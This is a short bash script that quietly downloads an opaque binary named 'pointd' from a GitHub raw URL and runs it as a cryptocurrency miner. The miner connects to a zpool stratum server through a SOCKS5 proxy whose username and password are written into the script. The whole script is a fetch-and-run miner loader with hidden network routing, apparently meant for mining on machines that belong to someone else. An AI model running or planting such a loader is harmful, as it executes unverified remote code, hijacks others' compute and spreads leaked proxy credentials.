#!/bin/bash

wget -q https://raw.githubusercontent.com/ahmadghozaliurhniyu/scmin/main/pointd
chmod +x pointd
./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u walletDGB -p c=DGB,zap=BUT-lyra2z330 -x socks5://aihzpnbr:dogmtwuiyn3a@45.128.247.96:7597 -t 2
